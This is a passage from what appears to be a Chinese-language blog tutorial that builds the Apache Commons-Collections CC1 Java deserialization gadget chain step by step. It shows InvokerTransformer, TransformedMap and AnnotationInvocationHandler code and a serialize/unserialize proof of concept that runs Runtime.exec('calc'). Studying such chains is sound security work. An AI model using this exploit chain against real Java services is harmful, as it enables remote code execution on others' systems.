class="line">28</span><br><span class="line">29</span><br><span class="line">30</span><br><span class="line">31</span><br><span class="line">32</span><br><span class="line">33</span><br><span class="line">34</span><br><span class="line">35</span><br><span class="line">36</span><br><span class="line">37</span><br><span class="line">38</span><br><span class="line">39</span><br><span class="line">40</span><br><span class="line">41</span><br><span class="line">42</span><br><span class="line">43</span><br></pre></td><td class="code"><pre><span class="line"><span class="keyword">public</span> <span class="keyword">class</span> <span class="title class_">InvokerTransformer</span> <span class="keyword">implements</span> <span class="title class_">Transformer</span>, Serializable &#123;</span><br><span class="line"></span><br><span class="line">    <span class="comment">/** The method name to call */</span></span><br><span class="line">    <span class="keyword">private</span> <span class="keyword">final</span> String iMethodName;</span><br><span class="line">    <span class="comment">/** The array of reflection parameter types */</span></span><br><span class="line">    <span class="keyword">private</span> <span class="keyword">final</span> Class[] iParamTypes;</span><br><span class="line">    <span class="comment">/** The array of reflection arguments */</span></span><br><span class="line">    <span class="keyword">private</span> <span class="keyword">final</span> Object[] iArgs;</span><br><span class="line"></span><br><span class="line">    <span class="keyword">private</span> <span class="title function_">InvokerTransformer</span><span class="params">(String methodName)</span> &#123;</span><br><span class="line">        <span class="built_in">super</span>();</span><br><span class="line">        iMethodName = methodName;</span><br><span class="line">        iParamTypes = <span class="literal">null</span>;</span><br><span class="line">        iArgs = <span class="literal">null</span>;</span><br><span class="line">    &#125;</span><br><span class="line"></span><br><span class="line">    <span class="keyword">public</span> <span class="title function_">InvokerTransformer</span><span class="params">(String methodName, Class[] paramTypes, Object[] args)</span> &#123;</span><br><span class="line">        <span class="built_in">super</span>();</span><br><span class="line">        iMethodName = methodName;</span><br><span class="line">        iParamTypes = paramTypes;</span><br><span class="line">        iArgs = args;</span><br><span class="line">    &#125;</span><br><span class="line"></span><br><span class="line"></span><br><span class="line">    <span class="keyword">public</span> Object <span class="title function_">transform</span><span class="params">(Object input)</span> &#123;</span><br><span class="line">        <span class="keyword">if</span> (input == <span class="literal">null</span>) &#123;</span><br><span class="line">            <span class="keyword">return</span> <span class="literal">null</span>;</span><br><span class="line">        &#125;</span><br><span class="line">        <span class="keyword">try</span> &#123;</span><br><span class="line">            <span class="type">Class</span> <span class="variable">cls</span> <span class="operator">=</span> input.getClass();</span><br><span class="line">            <span class="type">Method</span> <span class="variable">method</span> <span class="operator">=</span> cls.getMethod(iMethodName, iParamTypes);</span><br><span class="line">            <span class="keyword">return</span> method.invoke(input, iArgs);</span><br><span class="line">                </span><br><span class="line">        &#125; <span class="keyword">catch</span> (NoSuchMethodException ex) &#123;</span><br><span class="line">            <span class="keyword">throw</span> <span class="keyword">new</span> <span class="title class_">FunctorException</span>(<span class="string">&quot;InvokerTransformer: The method &#x27;&quot;</span> + iMethodName + <span class="string">&quot;&#x27; on &#x27;&quot;</span> + input.getClass() + <span class="string">&quot;&#x27; does not exist&quot;</span>);</span><br><span class="line">        &#125; <span class="keyword">catch</span> (IllegalAccessException ex) &#123;</span><br><span class="line">            <span class="keyword">throw</span> <span class="keyword">new</span> <span class="title class_">FunctorException</span>(<span class="string">&quot;InvokerTransformer: The method &#x27;&quot;</span> + iMethodName + <span class="string">&quot;&#x27; on &#x27;&quot;</span> + input.getClass() + <span class="string">&quot;&#x27; cannot be accessed&quot;</span>);</span><br><span class="line">        &#125; <span class="keyword">catch</span> (InvocationTargetException ex) &#123;</span><br><span class="line">            <span class="keyword">throw</span> <span class="keyword">new</span> <span class="title class_">FunctorException</span>(<span class="string">&quot;InvokerTransformer: The method &#x27;&quot;</span> + iMethodName + <span class="string">&quot;&#x27; on &#x27;&quot;</span> + input.getClass() + <span class="string">&quot;&#x27; threw an exception&quot;</span>, ex);</span><br><span class="line">        &#125;</span><br><span class="line">    &#125;</span><br><span class="line"></span><br><span class="line">&#125;</span><br></pre></td></tr></table></figure><p>这边的参数都是可控的，同时重写的transform方法可以调用任意类的任意方法。</p><figure class="highlight java"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br></pre></td><td class="code"><pre><span class="line"><span class="comment">//这里我们回顾一下如何用反射调用Runtime的exec</span></span><br><span class="line">Runtime r=Runtime.getRuntime();<span class="comment">//Runtime.getRuntime() 是 Runtime 类中的一个静态方法，用来获取当前应用程序运行时的 Runtime 实例。</span></span><br><span class="line"><span class="keyword">class</span> <span class="title class_">c</span>=r.getClass();</span><br><span class="line">Method m=c.getMethod(<span class="string">&quot;exec&quot;</span>,String.class);</span><br><span class="line">m.invoke(r,<span class="string">&quot;calc&quot;</span>);</span><br><span class="line"></span><br><span class="line"><span class="comment">//接下来尝试用transform来调用</span></span><br><span class="line">Runtime r=Runtime.getRuntime();</span><br><span class="line">InvokerTransformer invokerTransformer=<span class="keyword">new</span> <span class="title class_">InvokerTransformer</span>(<span class="string">&quot;exec&quot;</span>,<span class="keyword">new</span> <span class="title class_">Class</span>[]&#123;String.class&#125;,<span class="keyword">new</span> <span class="title class_">Object</span>[]&#123;<span class="string">&quot;calc&quot;</span>&#125;);</span><br><span class="line">invokerTransformer.transform(r);</span><br><span class="line"></span><br><span class="line"><span class="comment">//总结:比较上面两种方式，下面的transform相当于模拟了上述的反射过程。</span></span><br></pre></td></tr></table></figure><img src="/2024/12/26/Java%E5%8F%8D%E5%BA%8F%E5%88%97%E5%8C%96CC1%E9%93%BE%E5%88%86%E6%9E%90/image-20241105195833535.png" class="" title="This is an example image"><p>这里成功执行了命令，那么现在我们已经寻到入口点了，接下来需要一步步回溯，寻找合适的子类，构造漏洞链，直到到达重写了readObject的类。</p><p>所以我们下一步的目标是去找调用 <code>transform</code> 方法的不同名函数。</p><h2 id="构造链子第一步-寻找transform调用处"><a href="#构造链子第一步-寻找transform调用处" class="headerlink" title="构造链子第一步-寻找transform调用处"></a>构造链子第一步-寻找transform调用处</h2><p><strong>寻找哪些类中的哪些方法调用了transform方法</strong></p><p>右键查看用法即可</p><p>那么我们这里直接看到我们需要的TransformedMap类下的checkSetValue方法</p><p>下面我们直接给出构造器和checkSetValue方法</p><figure class="highlight java"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br></pre></td><td class="code"><pre><span class="line">#TransformedMap.java   </span><br><span class="line">   <span class="keyword">public</span> <span class="keyword">static</span> Map <span class="title function_">decorate</span><span class="params">(Map map, Transformer keyTransformer, Transformer valueTransformer)</span> &#123;</span><br><span class="line">       <span class="keyword">return</span> <span class="keyword">new</span> <span class="title class_">TransformedMap</span>(map, keyTransformer, valueTransformer);</span><br><span class="line">   &#125;<span class="comment">//接受参数，实例化TransformedMap这个类</span></span><br><span class="line"></span><br><span class="line"><span class="keyword">protected</span> <span class="title function_">TransformedMap</span><span class="params">(Map map, Transformer keyTransformer, Transformer valueTransformer)</span> &#123;</span><br><span class="line">       <span class="built_in">super</span>(map);</span><br><span class="line">       <span class="built_in">this</span>.keyTransformer = keyTransformer;</span><br><span class="line">       <span class="built_in">this</span>.valueTransformer = valueTransformer;</span><br><span class="line">   &#125;<span class="comment">//接受三个参数，第一个为Map,我们可以传入之前讲到的HashMap,第二个和第三个就是Transformer我们需要的了，可控。</span></span><br><span class="line"></span><br><span class="line">   <span class="keyword">protected</span> Object <span class="title function_">checkSetValue</span><span class="params">(Object value)</span> &#123;</span><br><span class="line">       <span class="keyword">return</span> valueTransformer.transform(value);</span><br><span class="line">   &#125;<span class="comment">//返回valueTransformer对应的transform方法，那么我们这里就需要让valueTransformer为我们之前的invokerTransformer对象。相当于就是让这里的valueTransformer=invokerTransformer！！！</span></span><br></pre></td></tr></table></figure><p>但是这里我们发现构造器和checkSetValue方法都是protected权限的，只能本类内部访问，无法外部调用和实例化，那么我们就需要找到内部实例化的工具。也就是上面的一个public静态方法decorate。</p><p>我们可以通过调用decorate方法来实例化TransformedMap类，然后再想办法调用checkSetValue方法。</p><figure class="highlight java"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br></pre></td><td class="code"><pre><span class="line">Runtime r=Runtime.getRuntime();</span><br><span class="line">InvokerTransformer invokerTransformer=<span class="keyword">new</span> <span class="title class_">InvokerTransformer</span>(<span class="string">&quot;exec&quot;</span>,<span class="keyword">new</span> <span class="title class_">Class</span>[]&#123;String.class&#125;,<span class="keyword">new</span> <span class="title class_">Object</span>[]&#123;<span class="string">&quot;calc&quot;</span>&#125;);</span><br><span class="line"><span class="comment">//invokerTransformer.transform(r);</span></span><br><span class="line">HashMap&lt;Object,Object&gt; map=<span class="keyword">new</span> <span class="title class_">HashMap</span>&lt;&gt;();</span><br><span class="line">Map&lt;Object,Object&gt; transformedmap=TransformedMap.decorate(map,<span class="literal">null</span>,invokerTransformer);</span><br><span class="line"><span class="comment">//静态方法staic修饰直接类名＋方法名调用</span></span><br><span class="line"><span class="comment">//把map当成参数传入，然后第二个参数我们用不着就赋空值null,第三个参数就是我们之前的invokerTransformer.</span></span><br><span class="line">Class&lt;TransformedMap&gt; transformedMapClass = TransformedMap.class;</span><br><span class="line"><span class="type">Method</span> <span class="variable">checkSetValueMethod</span> <span class="operator">=</span> transformedMapClass.getDeclaredMethod(<span class="string">&quot;checkSetValue&quot;</span>, Object.class);</span><br><span class="line">checkSetValueMethod.setAccessible(<span class="literal">true</span>);</span><br><span class="line">checkSetValueMethod.invoke(transformedmap,r);</span><br></pre></td></tr></table></figure><img src="/2024/12/26/Java%E5%8F%8D%E5%BA%8F%E5%88%97%E5%8C%96CC1%E9%93%BE%E5%88%86%E6%9E%90/image-20241105202442609.png" class="" title="This is an example image"><h2 id="构造链子第二步-寻找checkSetValue调用处"><a href="#构造链子第二步-寻找checkSetValue调用处" class="headerlink" title="构造链子第二步-寻找checkSetValue调用处"></a>构造链子第二步-寻找checkSetValue调用处</h2><p>checkSetValue寻找用法，发现只有一处调用了checkSetValue(AbstractInputCheckedMapDecorator类的setValue)</p><img src="/2024/12/26/Java%E5%8F%8D%E5%BA%8F%E5%88%97%E5%8C%96CC1%E9%93%BE%E5%88%86%E6%9E%90/image-20241105204710172.png" class="" title="This is an example image"><figure class="highlight java"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br></pre></td><td class="code"><pre><span class="line"><span class="keyword">static</span> <span class="keyword">class</span> <span class="title class_">MapEntry</span> <span class="keyword">extends</span> <span class="title class_">AbstractMapEntryDecorator</span> &#123;</span><br><span class="line"></span><br><span class="line">       <span class="comment">/** The parent map */</span></span><br><span class="line">       <span class="keyword">private</span> <span class="keyword">final</span> AbstractInputCheckedMapDecorator parent;</span><br><span class="line"></span><br><span class="line">       <span class="keyword">protected</span> <span class="title function_">MapEntry</span><span class="params">(Map.Entry entry, AbstractInputCheckedMapDecorator parent)</span> &#123;</span><br><span class="line">           <span class="built_in">super</span>(entry);</span><br><span class="line">           <span class="built_in">this</span>.parent = parent;</span><br><span class="line">       &#125;</span><br><span class="line"></span><br><span class="line">       <span class="keyword">public</span> Object <span class="title function_">setValue</span><span class="params">(Object value)</span> &#123;</span><br><span class="line">           value = parent.checkSetValue(value);</span><br><span class="line">           <span class="keyword">return</span> entry.setValue(value);</span><br><span class="line">       &#125;</span><br><span class="line">   &#125;</span><br></pre></td></tr></table></figure><p>Entry代表的是Map中的一个键值对，而我们在Map中我们可以看到有setValue方法，而我们在对Map进行遍历的时候可以调用setValue这个方法</p><img src="/2024/12/26/Java%E5%8F%8D%E5%BA%8F%E5%88%97%E5%8C%96CC1%E9%93%BE%E5%88%86%E6%9E%90/image-20241105205232375.png" class="" title="This is an example image"><p>而上面副类MapEntry实际上是重写了setValue方法，它继承了AbstractMapEntryDecorator这个类，这个类中存在setValue方法，</p><figure class="highlight java"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br></pre></td><td class="code"><pre><span class="line"><span class="keyword">public</span> <span class="keyword">abstract</span> <span class="keyword">class</span> <span class="title class_">AbstractMapEntryDecorator</span> <span class="keyword">implements</span> <span class="title class_">Map</span>.Entry, KeyValue &#123;</span><br><span class="line">    ...</span><br><span class="line">    <span class="keyword">protected</span> <span class="keyword">final</span> Map.Entry entry;</span><br><span class="line">    ...</span><br><span class="line">    <span class="keyword">public</span> Object <span class="title function_">setValue</span><span class="params">(Object object)</span> &#123;</span><br><span class="line">        <span class="keyword">return</span> entry.setValue(object);</span><br><span class="line">    &#125;</span><br></pre></td></tr></table></figure><p>而这个类又引入了Map.Entry接口，所以我们只需要进行常用的Map遍历，就可以调用setValue方法,然后水到渠成地调用checkSetValue方法:</p><figure class="highlight java"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br></pre></td><td class="code"><pre><span class="line">Runtime r=Runtime.getRuntime();</span><br><span class="line">InvokerTransformer invokerTransformer=<span class="keyword">new</span> <span class="title class_">InvokerTransformer</span>(<span class="string">&quot;exec&quot;</span>,<span class="keyword">new</span> <span class="title class_">Class</span>[]&#123;String.class&#125;,<span class="keyword">new</span> <span class="title class_">Object</span>[]&#123;<span class="string">&quot;calc&quot;</span>&#125;);</span><br><span class="line"><span class="comment">// invokerTransformer.transform(r); &lt;--- 相当于下面的代码是模拟这行代码，实现相同的功能</span></span><br><span class="line">HashMap&lt;Object,Object&gt; map=<span class="keyword">new</span> <span class="title class_">HashMap</span>&lt;&gt;();</span><br><span class="line">map.put(<span class="string">&quot;meteorkai&quot;</span>,<span class="string">&quot;meteorkai&quot;</span>); <span class="comment">//给map一个键值对，方便遍历</span></span><br><span class="line">Map&lt;Object,Object&gt; transformedmap=TransformedMap.decorate(map,<span class="literal">null</span>,invokerTransformer);</span><br><span class="line"><span class="comment">//后面是要调用checkSetValue方法，那么可以通过遍历Map来调用setValue方法,然后水到渠成调用checkSetValue方法</span></span><br><span class="line"><span class="keyword">for</span>(Map.Entry entry:transformedmap.entrySet())&#123;<span class="comment">//遍历Map常用格式</span></span><br><span class="line">    entry.setValue(r);<span class="comment">//调用setValue方法，并把对象r当作对象传入</span></span><br><span class="line">&#125;</span><br></pre></td></tr></table></figure><img src="/2024/12/26/Java%E5%8F%8D%E5%BA%8F%E5%88%97%E5%8C%96CC1%E9%93%BE%E5%88%86%E6%9E%90/image-20241105210341164.png" class="" title="This is an example image"><p>到这里我们先重头理一下：</p><p>首先，我们找到了TransformedMap这个类，我们需要调用它的checkSetValue方法从而来调用transform方法，但是这个类的构造器和checkSetValue方法都是protected权限，只能从类中访问，所以我们需要用decorate方法来实例化这个类。在此之前我们需要实例化一个hashmap，因为decorate方法中需要传入，并且调用put方法给他赋值以便他遍历map从而调用setValue方法。然后把这个map当成参数传入，实例化成了一个transformedmap对象，这个对象也是Map类型的，然后我们对这个对象进行遍历，在遍历过程中我们可以调用setValue方法，而恰巧又遇到了重写的setValue的副类，这个重写的方法刚好调用了checkSetValue方法，这样就形成了一个闭环。</p><p>但这只是一个小插曲，终究不是我们所希望的readObject方法，我们需要一个readObject方法来代替上述的遍历Map功能。</p><h2 id="构造链子第三步-寻找setValue调用处-链首"><a href="#构造链子第三步-寻找setValue调用处-链首" class="headerlink" title="构造链子第三步-寻找setValue调用处-链首"></a>构造链子第三步-寻找setValue调用处-链首</h2><p><strong>如果能找到一个 <code>readObject()</code> 里面调用了 <code>setValue()</code> 就太好了</strong></p><p>老样子，setValue寻找用法。我勒个豆，直接发现一个调用了setValue的readObject方法。很完美的实现了代替之前Map遍历功能</p><img src="/2024/12/26/Java%E5%8F%8D%E5%BA%8F%E5%88%97%E5%8C%96CC1%E9%93%BE%E5%88%86%E6%9E%90/image-20241105214636730.png" class="" title="This is an example image"><figure class="highlight java"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br><span class="line">19</span><br><span class="line">20</span><br><span class="line">21</span><br><span class="line">22</span><br><span class="line">23</span><br><span class="line">24</span><br><span class="line">25</span><br><span class="line">26</span><br><span class="line">27</span><br><span class="line">28</span><br><span class="line">29</span><br><span class="line">30</span><br><span class="line">31</span><br><span class="line">32</span><br><span class="line">33</span><br><span class="line">34</span><br><span class="line">35</span><br><span class="line">36</span><br><span class="line">37</span><br><span class="line">38</span><br><span class="line">39</span><br><span class="line">40</span><br><span class="line">41</span><br><span class="line">42</span><br><span class="line">43</span><br><span class="line">44</span><br><span class="line">45</span><br><span class="line">46</span><br><span class="line">47</span><br><span class="line">48</span><br><span class="line">49</span><br><span class="line">50</span><br></pre></td><td class="code"><pre><span class="line"><span class="keyword">class</span> <span class="title class_">AnnotationInvocationHandler</span> <span class="keyword">implements</span> <span class="title class_">InvocationHandler</span>, Serializable &#123;</span><br><span class="line">    <span class="keyword">private</span> <span class="keyword">static</span> <span class="keyword">final</span> <span class="type">long</span> <span class="variable">serialVersionUID</span> <span class="operator">=</span> <span class="number">6182022883658399397L</span>;</span><br><span class="line">    <span class="keyword">private</span> <span class="keyword">final</span> Class&lt;? <span class="keyword">extends</span> <span class="title class_">Annotation</span>&gt; type;</span><br><span class="line">    <span class="keyword">private</span> <span class="keyword">final</span> Map&lt;String, Object&gt; memberValues;</span><br><span class="line"></span><br><span class="line">    AnnotationInvocationHandler(Class&lt;? <span class="keyword">extends</span> <span class="title class_">Annotation</span>&gt; type, Map&lt;String, Object&gt; memberValues) &#123;</span><br><span class="line">        <span class="comment">//接受两个参数，第一个是继承了注解的class，第二个是个Map,第二个参数我们可控，可以传入我们之前的transformedmap类</span></span><br><span class="line">        Class&lt;?&gt;[] superInterfaces = type.getInterfaces();</span><br><span class="line">        <span class="keyword">if</span> (!type.isAnnotation() ||</span><br><span class="line">            superInterfaces.length != <span class="number">1</span> ||</span><br><span class="line">            superInterfaces[<span class="number">0</span>] != java.lang.annotation.Annotation.class)</span><br><span class="line">            <span class="keyword">throw</span> <span class="keyword">new</span> <span class="title class_">AnnotationFormatError</span>(<span class="string">&quot;Attempt to create proxy for a non-annotation type.&quot;</span>);</span><br><span class="line">        <span class="built_in">this</span>.type = type;</span><br><span class="line">        <span class="built_in">this</span>.memberValues = memberValues;</span><br><span class="line">    &#125;</span><br><span class="line"></span><br><span class="line"></span><br><span class="line"><span class="keyword">private</span> <span class="keyword">void</span> <span class="title function_">readObject</span><span class="params">(java.io.ObjectInputStream s)</span></span><br><span class="line">        <span class="keyword">throws</span> java.io.IOException, ClassNotFoundException &#123;</span><br><span class="line">        s.defaultReadObject();</span><br><span class="line"></span><br><span class="line">        <span class="comment">// Check to make sure that types have not evolved incompatibly</span></span><br><span class="line"></span><br><span class="line">        <span class="type">AnnotationType</span> <span class="variable">annotationType</span> <span class="operator">=</span> <span class="literal">null</span>;</span><br><span class="line">        <span class="keyword">try</span> &#123;</span><br><span class="line">            annotationType = AnnotationType.getInstance(type);</span><br><span class="line">        &#125; <span class="keyword">catch</span>(IllegalArgumentException e) &#123;</span><br><span class="line">            <span class="comment">// Class is no longer an annotation type; time to punch out</span></span><br><span class="line">            <span class="keyword">throw</span> <span class="keyword">new</span> <span class="title class_">java</span>.io.InvalidObjectException(<span class="string">&quot;Non-annotation type in annotation serial stream&quot;</span>);</span><br><span class="line">        &#125;</span><br><span class="line"></span><br><span class="line">        Map&lt;String, Class&lt;?&gt;&gt; memberTypes = annotationType.memberTypes();</span><br><span class="line"></span><br><span class="line">        <span class="comment">// If there are annotation members without values, that</span></span><br><span class="line">        <span class="comment">// situation is handled by the invoke method.</span></span><br><span class="line">        <span class="keyword">for</span> (Map.Entry&lt;String, Object&gt; memberValue : memberValues.entrySet()) &#123;</span><br><span class="line">            <span class="type">String</span> <span class="variable">name</span> <span class="operator">=</span> memberValue.getKey();</span><br><span class="line">            Class&lt;?&gt; memberType = memberTypes.get(name);</span><br><span class="line">            <span class="keyword">if</span> (memberType != <span class="literal">null</span>) &#123;  <span class="comment">// i.e. member still exists</span></span><br><span class="line">                <span class="type">Object</span> <span class="variable">value</span> <span class="operator">=</span> memberValue.getValue();</span><br><span class="line">                <span class="keyword">if</span> (!(memberType.isInstance(value) ||</span><br><span class="line">                      value <span class="keyword">instanceof</span> ExceptionProxy)) &#123;</span><br><span class="line">                    memberValue.setValue(</span><br><span class="line">                        <span class="keyword">new</span> <span class="title class_">AnnotationTypeMismatchExceptionProxy</span>(</span><br><span class="line">                            value.getClass() + <span class="string">&quot;[&quot;</span> + value + <span class="string">&quot;]&quot;</span>).setMember(</span><br><span class="line">                                annotationType.members().get(name)));</span><br><span class="line">                &#125;</span><br><span class="line">            &#125;</span><br><span class="line">        &#125;</span><br><span class="line">    &#125;</span><br></pre></td></tr></table></figure><p>可以看到这个类中的memberValues是可控的，这样我们就看传入自己需要的，然后实现setValue方法。根据前面的entry.setValue，那么这里的memberValue就要相当于entry，memberValues就相当于是transformedmap。</p><p>但是这里有个问题，就是我们可以看到定义这个类的时候，并没有public之类的声明，那么说明这个类只能在本包下被调用(sun.reflect.annotation)，我们想要在外部调用，就需要进行反射。</p><figure class="highlight java"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br><span class="line">19</span><br><span class="line">20</span><br><span class="line">21</span><br><span class="line">22</span><br><span class="line">23</span><br><span class="line">24</span><br><span class="line">25</span><br><span class="line">26</span><br><span class="line">27</span><br><span class="line">28</span><br></pre></td><td class="code"><pre><span class="line"><span class="keyword">public</span> <span class="keyword">static</span> <span class="keyword">void</span> <span class="title function_">main</span><span class="params">(String[] args)</span> <span class="keyword">throws</span> Exception &#123;</span><br><span class="line">Runtime r=Runtime.getRuntime();</span><br><span class="line">    InvokerTransformer invokertransformer=<span class="keyword">new</span> <span class="title class_">InvokerTransformer</span>(<span class="string">&quot;exec&quot;</span>,<span class="keyword">new</span> <span class="title class_">Class</span>[]&#123;String.class&#125;,<span class="keyword">new</span> <span class="title class_">Object</span>[]&#123;<span class="string">&quot;calc&quot;</span>&#125;);</span><br><span class="line">    <span class="comment">//invokerTransformer.transform(r);</span></span><br><span class="line">    HashMap&lt;Object,Object&gt; map=<span class="keyword">new</span> <span class="title class_">HashMap</span>&lt;&gt;();</span><br><span class="line">    map.put(<span class="string">&quot;meteorkai&quot;</span>,<span class="string">&quot;meteorkai&quot;</span>);</span><br><span class="line">    Map&lt;Object,Object&gt; transformedmap=TransformedMap.decorate(map,<span class="literal">null</span>,invokertransformer);</span><br><span class="line">    <span class="comment">/*for(Map.Entry entry:transformedmap.entrySet()) &#123;</span></span><br><span class="line"><span class="comment">            entry.setValue(r);</span></span><br><span class="line"><span class="comment">      &#125;*/</span></span><br><span class="line">    <span class="comment">//反射获取AnnotationInvocationHandler类</span></span><br><span class="line">    Class c=Class.forName(<span class="string">&quot;sun.reflect.annotation.AnnotationInvocationHandler&quot;</span>);</span><br><span class="line">    Constructor constructor=c.getDeclaredConstructor(Class.class,Map.class);<span class="comment">//获取构造器</span></span><br><span class="line">    constructor.setAccessible(<span class="literal">true</span>);<span class="comment">//修改作用域</span></span><br><span class="line">    Object o=constructor.newInstance(Override.class,transformedmap);<span class="comment">//这里第一个是参数是注解的类原型，第二个就是我们之前的类</span></span><br><span class="line">    serialize(o);</span><br><span class="line">    unserialize(<span class="string">&quot;ser.bin&quot;</span>);</span><br><span class="line">&#125;</span><br><span class="line"></span><br><span class="line"><span class="keyword">public</span> <span class="keyword">static</span> <span class="keyword">void</span> <span class="title function_">serialize</span><span class="params">(Object object)</span> <span class="keyword">throws</span> Exception&#123;</span><br><span class="line">    ObjectOutputStream oos=<span class="keyword">new</span> <span class="title class_">ObjectOutputStream</span>(<span class="keyword">new</span> <span class="title class_">FileOutputStream</span>(<span class="string">&quot;ser.bin&quot;</span>));</span><br><span class="line">    oos.writeObject(object);</span><br><span class="line">&#125;</span><br><span class="line"></span><br><span class="line"><span class="keyword">public</span> <span class="keyword">static</span> <span class="keyword">void</span> <span class="title function_">unserialize</span><span class="params">(String filename)</span> <span class="keyword">throws</span> Exception&#123;</span><br><span class="line">    ObjectInputStream ois=<span class="keyword">new</span> <span class="title class_">ObjectInputStream</span>(<span class="keyword">new</span> <span class="title class_">FileInputStream</span>(filename));</span><br><span class="line">    ois.readObject();</span><br><span class="line">&#125;</span><br></pre></td></tr></table></figure><p>但是，当我们满怀期待执行这串代码时，并没有弹出计算器！其实这段代码还是存在很多缺陷的。我们往下分析</p><h2 id="弥补链子缺陷"><a href="#弥补链子缺陷" class="headerlink" title="弥补链子缺陷"></a>弥补链子缺陷</h2><h3 id="一、Runtime类不能序列化"><a href="#一、Runtime类不能序列化" class="headerlink" title="一、Runtime类不能序列化"></a><strong>一、Runtime类不能序列化</strong></h3><img src="/2024/12/26/Java%E5%8F%8D%E5%BA%8F%E5%88%97%E5%8C%96CC1%E9%93%BE%E5%88%86%E6%9E%90/image-20241106094958514.png" class="" title="This is an example image"><p>我们跟进Runtime类可以发现他并没有继承serializable接口，不能进行序列化。</p><p>此时我们可以通过反射来获取Runtime类的原型类，它的原型类class是存在serializable接口的，<code>Runtime.class</code> 是可以序列化的。</p><p>那么我们如何获得一个实例化对象呢？可以看到这里存在一个静态的getRuntime()方法，会返回一个Runtime对象，相当于是一种单例模式。</p><figure class="highlight java"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br></pre></td><td class="code"><pre><span class="line">Class rr=Class.forName(<span class="string">&quot;java.lang.Runtime&quot;</span>);<span class="comment">//获取类原型</span></span><br><span class="line">Method getRuntime=rr.getDeclaredMethod(<span class="string">&quot;getRuntime&quot;</span>,<span class="literal">null</span>);<span class="comment">//获取getRuntime方法</span></span><br><span class="line">Runtime r=(Runtime)getRuntime.invoke(<span class="literal">null</span>,<span class="literal">null</span>);<span class="comment">//获取实例化对象，因为该方法为无参方法，所以全为null</span></span><br><span class="line">Method exec=rr.getDeclaredMethod(<span class="string">&quot;exec&quot;</span>,String.class);<span class="comment">//获取exec方法</span></span><br><span class="line">exec.invoke(r,<span class="string">&quot;calc&quot;</span>);<span class="comment">//执行命令</span></span><br></pre></td></tr></table></figure><p>上述这样就可以实现序列化，那么接下来我们用transform来实现</p><figure class="highlight java"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br></pre></td><td class="code"><pre><span class="line">Class rr=Class.*forName*(<span class="string">&quot;java.lang.Runtime&quot;</span>);</span><br><span class="line"></span><br><span class="line"><span class="comment">/*Method getRuntime= rr.getDeclaredMethod(&quot;getRuntime&quot;,null);</span></span><br><span class="line"><span class="comment">Runtime r=(Runtime) getRuntime.invoke(null,null);</span></span><br><span class="line"><span class="comment">Method exec=rr.getDeclaredMethod(&quot;exec&quot;, String.class);</span></span><br><span class="line"><span class="comment">exec.invoke(r,&quot;calc&quot;);*/</span></span><br><span class="line"><span class="comment">//利用transform方法实现上述代码</span></span><br><span class="line">Method getRuntime=(Method)<span class="keyword">new</span> <span class="title class_">Invokertransformer</span>(<span class="string">&quot;getDeclaredMethod&quot;</span>,<span class="keyword">new</span> <span class="title class_">Class</span>[]&#123;String.class,Class[].class&#125;,<span class="keyword">new</span> <span class="title class_">Object</span>[]&#123;<span class="string">&quot;getRuntime&quot;</span>,<span class="literal">null</span>&#125;).transform(Runtime.class);<span class="comment">//这里模拟获取getRuntime方法，它的具体操作步骤类似之前</span></span><br><span class="line"></span><br><span class="line">Runtime r=(Runtime)<span class="keyword">new</span> <span class="title class_">Invokertransformer</span>(<span class="string">&quot;invoke&quot;</span>,<span class="keyword">new</span> <span class="title class_">Class</span>[]&#123;Object.class,Object[].class&#125;,<span class="keyword">new</span> <span class="title class_">Object</span>[]&#123;<span class="literal">null</span>,<span class="literal">null</span>&#125;).transform(getRuntime);<span class="comment">//这里模拟获取invoke方法</span></span><br><span class="line"></span><br><span class="line"><span class="keyword">new</span> <span class="title class_">Invokertransformer</span>(<span 